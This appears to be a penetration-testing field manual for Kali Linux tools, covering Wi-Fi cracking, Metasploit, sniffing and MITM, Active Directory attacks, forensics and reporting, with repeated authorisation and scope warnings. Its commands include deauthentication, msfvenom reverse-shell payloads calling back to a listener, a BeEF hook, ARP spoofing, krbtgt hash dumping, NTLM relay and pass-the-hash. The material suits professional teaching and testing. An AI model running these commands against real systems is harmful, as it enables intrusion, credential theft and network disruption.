Wireless testing starts with hardware, not software. The adapter must support monitor mode and packet injection, and the driver must expose them. It also starts with law: intercepting radio traffic you are not authorised to intercept is a criminal offence in many countries, and deauthentication disrupts real users. Lab first, client second, never "just the neighbours".

7 cardsmonitor + injectionradio law applies

Check the hardware before the toolchain

# Interface name, driver and supported modes
iw dev
iw list | grep -A 8 "Supported interface modes"
# A monitor-mode interface must appear after airmon-ng start; injection needs testing too.
sudo airmon-ng

In a VM, pass the USB adapter through to the guest. Internal laptop Wi-Fi cards often work in monitor mode but not in injection mode, and some drivers crash under monitor load. A rtl8812au, ath9k_htc or comparable external adapter is the usual answer.

airmon-ng

pkg: aircrack-ng

What it does. Manages monitor-mode interfaces for the Aircrack-ng suite. It lists adapters and their drivers, stops services that fight for the card, and creates a monitor interface such as wlan0mon.

sudo airmon-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# later, restore managed mode:
sudo airmon-ng stop wlan0mon
Run it
check kill stops NetworkManager, wpa_supplicant and similar services; expect your normal Wi-Fi to drop. Note the monitor interface name it prints, then pass that to airodump-ng and friends.
Avoid
Running check kill over a remote SSH session: you may cut the link you are working through. Do not assume a monitor interface means injection works; test it.
Instead of
iw dev wlan0 set type monitor is the manual route. airmon-ng is a convenience wrapper and a good first check, not the only way.

airodump-ng

pkg: aircrack-ng

What it does. Surveys 802.11 networks and captures frames: access points, clients, channels, encryption, signal strength and WPA handshakes. It is the passive eyes of the Aircrack-ng suite.

sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w evidence/wifi/cap wlan0mon
Run it
Survey first, then lock to one BSSID and channel. Wait for the WPA handshake marker before stopping. For 5 GHz, use --band a or a specific channel; captures from the wrong channel are empty.
Avoid
Capturing other people's traffic beyond what is necessary to prove the test. Do not leave a multi-hour capture running on a busy channel; the file grows and the evidence becomes a privacy liability.
Instead of
Kismet is better for long passive surveys and logging; airodump-ng is better for a focused handshake capture. Use both if the engagement allows it.

aireplay-ng

pkg: aircrack-ng

What it does. Injects 802.11 frames: deauthentication, fake authentication, ARP replay and other attacks. In modern WPA2 testing its main legitimate use is triggering a new handshake on a client you are authorised to test.

sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 wlan0mon
Run it
Send a small number of deauth frames, only to a client you are authorised to test, while airodump-ng is capturing. Stop as soon as the handshake is captured.
Avoid
Deauth floods. They disconnect users, break calls, trip wireless IDS and can be a denial-of-service offence. WPA3/PMF may ignore the frames entirely.
Instead of
Passive capture first; wait for a natural reconnect. Use wifite when you want the suite coordinated, and bettercap when you need a broader wireless/MITM workflow.

aircrack-ng

pkg: aircrack-ng

What it does. Recovers WEP and WPA/WPA2 keys from captured frames using a wordlist or, for WEP, statistical attacks. It is CPU-based and best treated as the classic reference rather than the fastest modern option.

aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF evidence/wifi/cap-01.cap
Run it
Confirm the capture actually contains a four-way handshake or PMKID before cracking. Use -e for the ESSID when the BSSID is ambiguous, and keep the capture hash for the report.
Avoid
Long CPU cracks on a laptop when a GPU and hashcat are available. WEP is historical; finding it is a finding, but do not build a modern methodology around it.
Instead of
hcxtools + hashcat -m 22000 is the modern WPA pipeline. aircrack-ng remains useful for a quick check and for learning the frame-level story.

hcxtools

pkg: hcxtools

What it does. Converts wireless captures into hashcat-friendly formats: EAPOL handshakes, PMKID and old WEP hashes. hcxpcapngtool is the bridge between aircrack-ng captures and GPU cracking.

hcxpcapngtool -o evidence/wifi/hash.hc22000 \
  -E evidence/wifi/essid.txt evidence/wifi/cap.pcapng
hashcat -m 22000 -a 0 evidence/wifi/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt -O -w 2
Run it
Feed it the raw pcapng, not a text export. Check the summary for a complete handshake or PMKID. Run hashcat -m 22000 with the appropriate rules and save the pot file.
Avoid
Assuming a PMKID is always available; not every access point exposes it. Do not publish captures that contain other clients' identifiers.
Instead of
hcxtools + hashcat is the fast, modern path; aircrack-ng is the classic all-in-one. Use hcxtools when GPU cracking matters.

wifite

pkg: wifite

What it does. Automates the Aircrack-ng workflow: scans, selects targets, captures handshakes, tries WPS and hands captures to a cracker. It is a coordinator, not a new radio capability.

sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt \
  --kill --nodeauths
Run it
Restrict to one target with --target-bssid and use --nodeauths unless you have explicit permission to deauth. --kill stops conflicting services; it will disconnect your normal Wi-Fi.
Avoid
Running it with defaults in a populated area: it will attack every network it sees. Do not use WPS attacks on networks you do not own; WPS is often disabled or locked out anyway.
Instead of
Use wifite for a guided capture in a lab; use the individual tools when you need control and clean evidence. Kismet surveys; bettercap adds MITM modules.

Kismet

pkg: kismet

What it does. A passive wireless detector, surveyor and IDS. It discovers access points, clients, probes and Bluetooth devices, logs everything with GPS support and serves a web interface. It does not need to transmit to map a radio environment.

sudo kismet -c wlan0mon
# web UI: http://127.0.0.1:2501
Run it
Put the card in monitor mode first. Use a dedicated capture directory, set a source name, and export the database/logs as evidence. Kismet is ideal for a site survey before any active test.
Avoid
Exposing the web UI beyond localhost without authentication and TLS. Do not enable active sources unless you mean to transmit.
Instead of
Kismet is passive breadth and logging; airodump-ng is focused capture; wifite automates attacks; bettercap is active MITM. Survey with Kismet before choosing a target.

07

Exploitation

Proof of impact, not a collection of shells

Exploitation is the smallest part of an assessment and the easiest to get wrong. A working exploit is not the objective; a reproducible, scoped demonstration of business impact is. The tool choices here are a framework, an archive, a payload generator and a browser hook — four different jobs that are often confused because they all produce "access".

4 cardsverify firstminimal impact

The scope does not expand with the shell

A session on host A is not permission to pivot to host B. Every new host, credential and data store must already be in scope or approved in writing. Stop at the agreed proof: one file listing, one screenshot, one read-only command. Persistence, data theft and lateral movement are separate authorisations, not automatic rights.

Metasploit Framework

pkg: metasploit-framework

What it does. An exploitation framework: modules for scanning, exploiting, payload delivery and post-exploitation, backed by a database of hosts, services, credentials and loot. It standardises the boring parts so you can focus on the target's specific behaviour.

sudo msfdb init
msfconsole -q
msf6 > workspace -a client
msf6 > db_import evidence/scans/services.xml
msf6 > search type:exploit platform:linux smb
msf6 > use exploit/linux/samba/is_known_pipename
msf6 > show options
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST 10.10.14.2
msf6 > check
msf6 > run
msf6 > sessions -l
Run it
Initialise the database once, import your nmap XML, and use check where the module supports it. Read info before run. Use setg for values shared across modules and spool to keep a transcript.
Avoid
Firing an exploit because its name matches a banner. Do not run auxiliary/scanner modules across whole ranges, and do not leave sessions open after the test window.
Instead of
searchsploit is a static archive of exploits; Metasploit is a runtime framework with payloads and sessions. msfvenom generates payloads; BeEF hooks browsers. They complement, not replace, each other.
Read the full Metasploit field manual

searchsploit

pkg: exploitdb

What it does. Searches a local copy of Exploit-DB and mirrors exploit code to your working directory. It is the fastest way to answer "is there public code for this exact product and version?" without a browser.

searchsploit apache 2.4.49
searchsploit -w apache 2.4
searchsploit -m 50383
searchsploit -x 50383
Run it
Search by product and version, then open the exploit with -x and read it before doing anything. -m copies it into the current directory. Check the platform, prerequisites and affected version in the header.
Avoid
Running downloaded exploit code blindly. Public exploits are frequently incomplete, destructive, outdated or malicious. Compile in an isolated VM, review every command, and never point an untested exploit at production.
Instead of
searchsploit finds code; Metasploit runs a curated module. If a Metasploit module exists, it is usually safer and easier to log. If it does not, searchsploit is the archive.

msfvenom

pkg: metasploit-framework

What it does. Generates payloads and encodes them into executables, scripts, documents and raw formats. It creates the file that calls back to your handler; it does not deliver it, and it does not make malware undetectable.

msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 -f elf -o agent.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe

msfvenom -l payloads | less
msfvenom -l formats | less
Run it
Match the architecture to the target and the payload to the handler. The staged form (meterpreter/reverse_tcp) needs a multi/handler; the stageless form (meterpreter_reverse_tcp) embeds everything. Test in the lab, verify with file, and keep the exact command in your notes.
Avoid
Believing an encoder is an antivirus bypass. Do not email payloads, host them publicly, or use them outside an authorised lab; that is malware delivery, not a test.
Instead of
msfvenom builds the artifact; Metasploit's handler receives it; searchsploit finds the vulnerability that lets you run it. Three stages, not one tool.

BeEF

pkg: beef-xss

What it does. The Browser Exploitation Framework: once an XSS payload hooks a browser, BeEF gives you a console of modules that can fingerprint it, read the DOM, capture keystrokes, redirect, or launch social-engineering prompts — only within what the browser and the page allow.

sudo beef-xss
# UI: http://127.0.0.1:3000
# Hook (authorised lab page):
<script src="http://10.10.14.2:3000/hook.js"></script>
Run it
Change the default credentials before exposing anything. The hook URL must be reachable from the victim browser, and the page must be in scope. Use one test browser profile and record module actions as evidence.
Avoid
Using it without a real XSS or HTML-injection primitive; BeEF is not a network exploit. Do not expose the console publicly, and do not use social-engineering modules on real employees without explicit permission.
Instead of
Metasploit exploits services and sessions; BeEF rides an already-hooked browser. XSS discovery comes from manual testing or a scanner; BeEF is the post-exploitation console for that browser.

08

Sniffing & man-in-the-middle

See the packets, then decide whether you are allowed to change them

Packet capture answers "what actually crossed the wire?". MITM answers "what happens if I sit in the middle?". The first is passive and relatively safe; the second changes the network, breaks sessions and is easy to run outside scope. Learn to read a capture before you poison an ARP table.

6 cardsBPF vs display filtersMITM changes traffic

Capture filters vs display filters

A capture filter (BPF, used by tcpdump/tshark/Wireshark capture and dumpcap) decides what is written to disk and cannot be changed later. A display filter (Wireshark/tshark expression) decides what you see from an existing capture. Filter at capture time to save disk; filter at display time to investigate.

Wireshark

pkg: wireshark

What it does. The reference graphical packet analyser: hundreds of protocol dissectors, stream following, object export, statistics, colour rules and decryption support. It reads captures produced by dumpcap, tshark or tcpdump.

sudo dumpcap -i eth0 -b filesize:100000 \
  -w evidence/sniff/capture.pcapng
sudo wireshark evidence/sniff/capture.pcapng
Run it
Capture with a filter such as tcp port 80 or tcp port 443, then use display filters like http.request.method == "POST" or tcp.flags.syn == 1 && tcp.flags.ack == 0. Follow a stream to read a conversation; export HTTP objects to recover files.
Avoid
Capturing personal data without a need and a retention rule. Do not run Wireshark as root all day; add your user to the wireshark group or use dumpcap capabilities. TLS is not readable without keys or a proxy.
Instead of
Wireshark for visual investigation; tshark for the same dissection on a server; tcpdump when only capture and a quick hex/text view are needed.

tshark

pkg: tshark

What it does. Wireshark's terminal engine. It captures and dissects packets, then extracts named fields into text, CSV or JSON — ideal for servers, automation and large captures where a GUI is not available.

tshark -i eth0 -f "tcp port 443" -Y "tls.handshake.type == 1" \
  -T fields -e ip.src -e tls.handshake.extensions_server_name

tshark -r evidence/sniff/capture.pcapng -Y "http.request" \
  -T fields -e http.host -e http.request.uri

tshark -r evidence/sniff/capture.pcapng -q -z io,phs
Run it
-f is the BPF capture filter; -Y is the display filter; -T fields -e selects columns. Write with -w, read with -r. Check drop counts on busy links.
Avoid
Dumping full packet details into a terminal on a high-traffic link. Do not parse with fragile text scraping when -T json gives you structure.
Instead of
tshark dissects protocols like Wireshark; tcpdump is lighter and does not decode application layers. Use tshark when field extraction matters.

tcpdump

pkg: tcpdump

What it does. A small, ubiquitous libpcap capture tool. It writes raw packets to a file or prints a compact summary, and its BPF syntax is the common language of packet capture. It is the tool you can rely on when nothing else is installed.

sudo tcpdump -i eth0 -nn -s0 -w evidence/sniff/cap.pcap \
  'tcp port 80 or tcp port 443'

sudo tcpdump -r evidence/sniff/cap.pcap -nn -A 'tcp port 80'
Run it
-s0 captures the full packet; -nn avoids DNS and service lookups; -w writes, -r reads. Use -c for a packet count and -C or -G to rotate files. Check the "packets dropped" line when you stop.
Avoid
Capturing on any at full speed and filling the disk. Do not print payloads with -A on a terminal you are sharing or recording; credentials may appear in clear text.
Instead of
tcpdump when you need a small reliable capture; Wireshark/tshark when you need protocol dissection. The tcpdump field manual on this blog goes deeper into filter grammar.

Ettercap

pkg: ettercap

What it does. A classic Layer-2 MITM suite: ARP poisoning, protocol dissectors, plugins and filters. It can place you between hosts, modify traffic with filters and capture credentials from insecure protocols.

sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -q -i eth0 -M arp:remote \
  /192.168.1.1// /192.168.1.50//
# restore forwarding and stop the poison when finished
Run it
Use -T for text or -G for the GUI; -M arp:remote selects the poisoning method; -w writes a pcap. Confirm IP forwarding is on before traffic flows, and restore the ARP tables after.
Avoid
Poisoning a production gateway. HTTPS does not become readable just because you are in the middle; you need TLS interception and a trusted CA. Filters can corrupt traffic and break applications.
Instead of
Bettercap is the modern, modular alternative with HTTP/HTTPS proxying and a live console. Ettercap is still useful for older filters and a quick ARP test.

bettercap

pkg: bettercap

What it does. A modular MITM console for Wi-Fi, Ethernet, Bluetooth LE, ARP, DNS, HTTP/HTTPS and more. Caplets script the session, and one interface can move from discovery to spoofing to credential capture without changing tools.

sudo bettercap -iface eth0
> net.probe on
> net.show
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on

sudo bettercap -iface wlan0
> wifi.recon on
> wifi.show
> wifi.deauth AA:BB:CC:DD:EE:FF
Run it
Type help inside the console. Scope the target with set arp.spoof.targets, enable only the modules you need, and watch the event stream. Use caplets for repeatable workflows and log the session.
Avoid
Running net.probe and spoofing on a network you do not own. HTTPS proxying needs a CA on the client; sslstrip is detectable, breaks sites and is not a substitute for proper TLS interception.
Instead of
Bettercap is the broad modern suite; ettercap is the classic L2 tool; Responder specialises in name-resolution credential capture. Do not run all three at once.

mitmproxy

pkg: mitmproxy

What it does. A scriptable intercepting proxy with three faces: mitmproxy (TUI), mitmweb (browser UI) and mitmdump (headless). Python addons can rewrite requests, replay flows and inspect decrypted TLS.

mitmproxy -p 8080
mitmweb -p 8081
mitmdump -w evidence/sniff/flows.mitm -p 8080
Run it
Install the mitmproxy CA on the test client, then set the client proxy to your listener. Use --allow-hosts to constrain scope and -w to save flows. Addons are the reason to choose it over a GUI proxy.
Avoid
Proxying other people's traffic without authorisation. Do not log credentials or personal data beyond the minimum; flows are evidence and liability at the same time.
Instead of
Burp/ZAP for manual web testing; mitmproxy for automation, CLI workflows and custom Python logic. All three need the same certificate trust and scope discipline.

Active Directory & post-exploitation

Graph first, sweep second, touch least

Active Directory is a graph of identities, permissions and trusts. The professional order is: collect the graph, find the shortest path to the objective, use the least invasive technique that proves it, and stop. Spraying credentials before understanding lockout policy is how assessments cause outages.

4 cardscollect → graph → least actionlockout policy

BloodHound

pkg: bloodhound

What it does. Collects AD relationships (users, groups, computers, sessions, ACLs, trusts) into a Neo4j graph and runs queries that show attack paths — for example, the shortest path from a compromised user to Domain Admin.

sudo neo4j console
bloodhound
# collector from a Linux host:
bloodhound-python -u user -p 'pass' -d CORP.LOCAL \
  -ns 10.10.0.10 -c DCOnly --zip
Run it
Start Neo4j before the GUI and change its default password. Import the ZIP, then use built-in queries such as "Shortest Paths to Domain Admins". -c DCOnly is quieter; -c All adds sessions, which are noisy and time-sensitive.
Avoid
Collecting the whole domain "just because". Do not leave Neo4j listening on a public interface, and treat the graph as sensitive client data — it is a map of every weakness in the domain.
Instead of
NetExec finds accessible services and shares; BloodHound explains why an identity can reach Domain Admin. Use NetExec to validate a path, not to guess one.

NetExec (nxc)

pkg: netexec

What it does. The maintained successor to CrackMapExec: a protocol-aware network sweep for SMB, WinRM, LDAP, MSSQL, SSH and more. It validates credentials, lists shares, users and sessions, and runs modules against hosts where the credential works.

nxc smb 10.10.10.0/24 -u user -p 'pass' -d CORP --shares
nxc smb 10.10.10.5 -u user -p 'pass' -d CORP --users --sessions
nxc winrm 10.10.10.5 -u user -p 'pass' -d CORP -x whoami
nxc ldap dc.corp.local -u user -p 'pass' --bloodhound --collection DCOnly
Run it
Test one credential against one host before any sweep. Use --jitter and a conservative --timeout, and stop on success where the module supports it. --shares is read-only; -x executes a command and is much noisier.
Avoid
Password spraying without the lockout threshold, observation window and a written guess budget. Do not use -x to run destructive commands or dump data beyond the agreed proof.
Instead of
NetExec is a fast sweep and validation layer; Impacket gives you one precise protocol operation; BloodHound maps the path. CrackMapExec is the older name — prefer nxc on current Kali.

Impacket

pkg: impacket-scripts

What it does. A Python library and a set of one-shot scripts for Windows network protocols: SMB, MSRPC, WMI, Kerberos, LDAP and more. secretsdump, wmiexec, GetUserSPNs and ntlmrelayx are the workhorses.

impacket-GetUserSPNs CORP/user:'pass' -dc-ip 10.10.0.10 -request
impacket-secretsdump -just-dc-user krbtgt \
  CORP/user:'pass'@dc.corp.local
impacket-wmiexec CORP/user:'pass'@10.10.10.5
impacket-ntlmrelayx -tf targets.txt -smb2support
Run it
Use -just-dc-user or a narrow target instead of dumping the entire domain. Save output with -outputfile, and prefer Kerberos (-k -no-pass) when you have a ticket. Read the script's help before using it.
Avoid
Running ntlmrelayx without checking SMB signing and without a target list. Do not leave dumped hashes in a terminal scrollback or an unencrypted notes file.
Instead of
Impacket for a precise protocol operation and scripting; NetExec for sweeping; Metasploit for a packaged exploit chain. They share concepts, not syntax.

Evil-WinRM

pkg: evil-winrm

What it does. An interactive WinRM shell with file upload/download, PowerShell script loading, binary execution and pass-the-hash support. It is the comfortable way to work on a Windows host once you have valid administrative credentials.

evil-winrm -i 10.10.10.5 -u user -p 'pass'
evil-winrm -i 10.10.10.5 -u user -H NTHASH
evil-winrm -i 10.10.10.5 -u user -p 'pass' \
  -s ./scripts -e ./binaries
Run it
WinRM must be enabled (5985/5986) and the account must be in the right group. Use upload/download sparingly, and keep a transcript. Certificate auth (-S/-K) avoids passwords where configured.
Avoid
Uploading tools you have not reviewed; everything you drop is evidence and possible malware. Do not keep an interactive shell open after the engagement or use it to browse unrelated data.
Instead of
wmiexec/psexec are other execution paths with different artefacts; WinRM is convenient but logged. Choose based on the environment and the evidence you want to leave.

Forensics & reversing

Preserve first, analyse second, explain third

Forensic tools do not tolerate improvisation. Hash before you open, work on copies, write-block when the source is physical, and document the command that produced every artefact. Reversing is the same discipline applied to code: understand the behaviour before you run it outside a sandbox.

8 cardshash → copy → analysechain of custody

Never analyse the only copy

Image the source, hash the image, hash the source if possible, and work only on the image. A mount with write access, an automatic "repair" or an in-place metadata edit can destroy the evidence and your credibility. Use a write blocker for physical media and record the tool, version and time.

Volatility 3

pkg: pipx volatility3

What it does. Analyses memory images: processes, network connections, loaded modules, command lines, injected code and credentials. It reconstructs operating-system structures without booting the captured machine. Volatility is no longer in the current Kali repositories, so install it in an isolated environment.

python3 -m venv ~/tools/vol
. ~/tools/vol/bin/activate
pip install volatility3
vol -f evidence/mem.raw windows.info
vol -f evidence/mem.raw windows.pslist
vol -f evidence/mem.raw windows.netscan
vol -f evidence/mem.raw windows.malfind
Run it
Hash the memory image before analysis. Run windows.info first to confirm the symbol layer, then targeted plugins. Use -o to keep output per plugin and --renderer json for machine-readable evidence. Download symbols once and keep them with the case for offline work.
Avoid
Assuming a process list is complete; rootkits hide, and terminated processes linger in pools. Do not analyse a live image in place, run plugins that modify the image, or install forensic dependencies globally on an evidence workstation.
Instead of
Volatility is for RAM; Autopsy and Sleuth Kit are for disk. They answer different questions and are strongest together.

Autopsy

pkg: autopsy (2.24)

What it does. A graphical forensic browser over Sleuth Kit. The version packaged in Kali is the classic Autopsy 2.24 web interface: it creates a case, adds a host and image, and browses the filesystem through the browser. Autopsy 4 is a separate desktop download with ingest modules and a different workflow.

sudo autopsy
# then open http://127.0.0.1:9999/autopsy
# create case → add host → add image → browse
Run it
Create one case per matter, add the image as a host, and record the case directory and image hash. For Autopsy 4, use its installer and ingest modules instead; do not assume the 2.24 workflow applies. Export only what the report needs.
Avoid
Adding a live filesystem or a mounted evidence disk. Do not run two interface instances against the same case database; corruption is quiet and expensive.
Instead of
Autopsy for a guided GUI; Sleuth Kit for scripted, repeatable extraction. Autopsy 2.24 is a browser over TSK, so the results should agree with the CLI.

Sleuth Kit (TSK)

pkg: sleuthkit

What it does. Command-line filesystem forensics: list partitions, walk directories, recover files by inode, build timelines and extract unallocated data. It is the engine beneath Autopsy and the right tool for repeatable, documented analysis.

mmls evidence/disk.img
fls -r -p -o 2048 evidence/disk.img
icat -o 2048 evidence/disk.img 12345 > evidence/recovered.bin
tsk_recover -o 2048 evidence/disk.img evidence/fs
Run it
mmls gives the partition offset for -o. Use fls -r -p for a recursive path listing, icat for one inode, tsk_recover for a tree. Hash every extracted file and keep the command log.
Avoid
Guessing the offset or the filesystem type. Do not extract into the evidence directory; write to a separate working directory and preserve the original image.
Instead of
Autopsy when you need a GUI and ingest; TSK when you need automation, a specific inode or a defensible command history.

binwalk

pkg: binwalk

What it does. Scans a binary or firmware image for embedded signatures — compressed archives, filesystems, kernels, bootloaders — and can extract them. It is the first tool for an unknown firmware blob.

binwalk firmware.bin
binwalk -A firmware.bin
binwalk -e firmware.bin
Run it
Signature scan first, entropy second, extraction last. -e uses external extractors and may need --run-as=root when run as root. Work on a copy in a container and keep the extracted tree.
Avoid
Extracting untrusted firmware on your host. Archives can contain path traversal, symlinks and malicious scripts. Do not treat a signature hit as proof of a filesystem until you mount or inspect it.
Instead of
foremost carves files by header/footer from disk images; binwalk finds embedded structures in firmware. Use binwalk for the container, foremost for the debris.

foremost

pkg: foremost

What it does. Carves files from disk images or raw data using header/footer signatures. It does not need the filesystem to be intact, which makes it useful for deleted or corrupted media.

foremost -t all -i evidence/disk.img -o evidence/carved
Run it
Choose file types with -t (or a config from /etc/foremost.conf) to reduce false positives. Carve to a separate volume with enough space, then hash and review the output.
Avoid
Treating every carved file as evidence; carvers produce fragments and false positives. Do not overwrite the source image or the working directory from a previous case.
Instead of
TSK recovers files with filesystem metadata; foremost recovers content by signature. If the filesystem is intact, TSK is more precise; if it is not, carve.

ExifTool

pkg: libimage-exiftool-perl

What it does. Reads and writes metadata in images, documents, audio and video: camera model, timestamps, GPS, software, author, edit history. It is essential for evidence triage and for understanding what a file leaks.

exiftool -a -u -g1 evidence/photo.jpg
exiftool -r -csv -ext jpg -ext png evidence/photos > evidence/metadata.csv
exiftool -GPSLatitude -GPSLongitude -n evidence/photo.jpg
exiftool -all= -o evidence/clean.jpg evidence/photo.jpg
Run it
Read with -a -u -g1 to see duplicate and unknown tags. Use -csv for a corpus. When stripping, write to a new file with -o; never modify the original evidence.
Avoid
Trusting metadata as ground truth; it can be edited or forged. Do not publish a photo without checking GPS and author fields first.
Instead of
ExifTool for inspection and controlled edits; mat2 for systematic metadata sanitisation before sharing. Both belong in a privacy workflow.

radare2

pkg: radare2

What it does. A scriptable reverse-engineering framework: disassembly, analysis, debugging, patching, string and structure inspection. It runs in the terminal and composes with pipes, which makes it ideal for repeatable binary triage.

r2 -A ./binary
[0x00000000]> afl
[0x00000000]> pdf @ main
[0x00000000]> iz
[0x00000000]> axt @ sym.imp.strcpy
[0x00000000]> q
Run it
-A analyses on load; afl lists functions; pdf prints one; iz shows strings; axt finds cross-references. Use rabin2 -I for a quick header and r2 -d to debug in a lab.
Avoid
Opening with -w unless you intend to patch. Do not run an unknown binary outside a sandbox just to "see what it does"; static first, then an isolated dynamic analysis.
Instead of
radare2 for fast CLI triage and scripting; Ghidra for decompiled C-like output and deep cross-reference work. Both are free and often used together.

Ghidra

pkg: ghidra

What it does. A software reverse-engineering suite with a decompiler, disassembler, symbol/cross-reference browser, scripting and version tracking. It turns machine code into readable pseudo-C and makes large binaries navigable.

ghidra
# headless analysis:
/usr/share/ghidra/support/analyzeHeadless /tmp/ghidra project -import ./binary
# then open the project in the GUI and inspect the decompiler
Run it
Create a project per case, import, let auto-analysis finish, then use the decompiler and cross-references. The support/analyzeHeadless script is for batch or server-side work. Keep notes of function names and hypotheses.
Avoid
Uploading confidential binaries to a public analysis service. Do not rename or patch the original file; work on a copy in the project and record hashes.
Instead of
Ghidra when you need decompiled logic; radare2 when you need a quick CLI answer or a script; a debugger when you need runtime behaviour.

Reporting & evidence

The deliverable is the report, not the shell

A finding that cannot be reproduced is an opinion. A finding without impact is a curiosity. A finding without a safe remediation is a complaint. The report is where technical work becomes something a client can budget, prioritise and fix — so build the evidence while you test, not the night before.

Anatomy of a usable finding

FieldWhat belongs thereCommon failure
TitleComponent + weakness + impact"SQL injection" with no asset
Affected assetURL, host, port, account, environmentOnly an IP from a stale scan
ReproductionNumbered steps and the exact request"Use sqlmap"
EvidenceRequest/response, screenshot, hash, timestampUnsaved terminal scrollback
ImpactWhat an attacker gains, in business terms"Critical because CVSS 9.8"
RemediationSpecific, testable fix and compensating control"Patch the server"
ReferencesCVE, vendor advisory, OWASP/CWEBroken links and blog posts

Severity is not risk. Use CVSS 3.1 consistently, then adjust the narrative for exposure, data sensitivity and compensating controls. Say which part is measured and which part is judgement. A CVSS vector without a sentence is a number looking for an argument.

Report platforms

Dradis (packaged in Kali's reporting set) imports scanner output into projects, lets you attach evidence and export to Word/PDF. Faraday is a separate client/server platform that imports many tool formats into a collaborative workspace; check whether your release packages it before relying on it. Both add structure; neither writes the impact analysis for you. These projects have changed their packaging more than once, so verify the installed version. 

# Dradis: start the local server, then import scan output in the web UI.
sudo dradis-start
sudo dradis-stop   # when the engagement is over

The evidence pack

Keep one directory per engagement, with subdirectories that match the report. Write raw output there as you work, then hash the tree before handover. This is also your defence if a client asks what you touched. 

evidence/
  scope/          signed scope, contacts, exclusions
  scans/          nmap -oA, masscan, nuclei, nikto
  web/            saved requests, ffuf JSON, screenshots
  creds/          hashes and recovered passwords (encrypted)
  wifi/           captures, hc22000, ESSID list
  ad/             BloodHound ZIP, NetExec logs, Impacket output
  forensics/      images, hashes, tool versions, notes
  logs/           session transcripts and timestamps
  report/         draft, findings, remediation

script -a evidence/logs/session-$(date +%F).txt
find evidence -type f -print0 | xargs -0 sha256sum > evidence/SHA256SUMS
# Encrypt before moving or archiving; never email a plaintext evidence pack.
tar -czf evidence.tar.gz evidence
gpg -c evidence.tar.gz   # produces evidence.tar.gz.gpg

Personal data is radioactive

Dump only the minimum proof. Redact tokens, session IDs and personal records in screenshots. Store credentials and evidence encrypted, restrict who can read them, and agree a destruction date in the contract. "The client can sue" is not the only risk; data-protection regulators have their own calendar.

A report skeleton that survives review

  1. Executive summary — two pages: what was tested, what matters, what to fix first.
  2. Scope and methodology — assets, dates, limits, tools and what was explicitly not tested.
  3. Findings by severity — each with evidence, impact and remediation; no duplicate findings for one root cause.
  4. Attack narrative — the chain that mattered, in prose, with the minimum necessary detail.
  5. Remediation plan — quick wins, structural fixes, verification steps and owners.
  6. Appendix — raw outputs, tool versions, evidence hashes, glossary.

For the blue-team consumer of your report, the red/blue lab manual shows how findings become detections.

Hardening your own Kali

The assessment laptop is a target too

An operator machine full of exploits, client data and credentials is a high-value target. The same discipline you sell to clients applies to your own box: least privilege, encryption, a small network surface, tested backups and a clean separation between engagements.

Baseline

# Current system, current tools; snapshot first on a VM.
sudo apt update && sudo apt full-upgrade -y
sudo kali-tweaks

# Host firewall: deny inbound, allow outbound, rate-limit SSH.
sudo apt install ufw lynis
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw limit 22/tcp
sudo ufw enable

# Audit what is listening and what starts at boot.
sudo ss -tulpn
sudo systemctl list-unit-files --state=enabled
sudo lynis audit system

Do not lock yourself out

Apply firewall rules from a local console or with a second SSH session already open. Confirm the SSH rule before enabling the firewall, and test a reconnect. The same rule applies to remote airmon-ng check kill and to any change that touches the interface you are using.

The operator checklist

  • Full-disk encryption on the laptop; a detached-header LUKS setup if you accept the recovery cost.
  • One VM per engagement, or at least a snapshot per engagement. Never mix a client's captures with another client's tooling.
  • A separate browser profile for testing, with its own CA store and no personal logins. Never import a testing CA into your daily browser.
  • No secrets in shell history. Use environment variables or a password manager; unset them after use. API tokens in a command line end up in logs.
  • SSH keys only, with a passphrase and a dedicated assessment key. The SSH configuration article covers the server side.
  • Firejail or a disposable VM for risky viewers and unknown files. The Firejail manual is the practical guide.
  • Encrypted evidence and a defined retention period. Delete client data when the contract says so, and record the deletion.
  • No public listeners. Bind ZAP, BeEF, SpiderFoot, Neo4j and Dradis to 127.0.0.1 unless you have added authentication and TLS.

Package hygiene

Kali is kali-rolling. Do not add Debian stable/testing repositories to "get a package"; the mix breaks dependencies and is a classic way to brick a rolling system. Prefer packages from Kali, then containers or virtual environments for tools that are not packaged. Never pipe a remote installer into a root shell. 

# Prefer a virtual environment for Python tooling.
python3 -m venv ~/tools/venv
. ~/tools/venv/bin/activate
pip install --upgrade pip

# Or a disposable container for a single tool.
sudo docker run --rm -it --network host kalilinux/kali-rolling /bin/bash

The Docker manual and Debian security manual cover the container and host sides in more depth. For a defensive build, pair this chapter with The Security Paranoid and The TUI Privacy Manual.

Runbooks

The order of operations for four common engagements

A runbook is not a script; it is a sequence of decisions with checkpoints. Adapt it to the scope, and write down deviations. The times are deliberately absent — they belong in the contract, not in a blog post.

A. External web application assessment

  1. Confirm scope and accounts. Domains, subdomains, login roles, excluded paths, rate limits, test window.
  2. Passive map. whois/RDAP, certificate transparency, dnsrecon, amass passive, theHarvester if contacts are in scope.
  3. Active map. nmap on in-scope hosts, whatweb/wafw00f on each web service, note the stack and the WAF.
  4. Proxy walk. Burp or ZAP with a dedicated browser; log in with each role, click every function, record APIs and hidden parameters.
  5. Content discovery. feroxbuster or ffuf with calibrated filters and a low rate; verify every hit manually.
  6. Targeted tests. Authentication, access control, injection, file handling, business logic — choose based on the map, not a checklist.
  7. Confirm and minimise. Reproduce with the smallest request; stop at proof; redact personal data; save the request/response.
  8. Report and handover. Findings, evidence hashes, remediation, retest criteria. Close sessions and remove test accounts.

B. Internal Active Directory assessment

  1. Scope the domain and the entry point. Domain name, DCs, subnets, supplied credentials, lockout policy, permitted techniques.
  2. Low-noise discovery. nmap on the DC and key servers; confirm DNS, LDAP, SMB, WinRM and Kerberos.
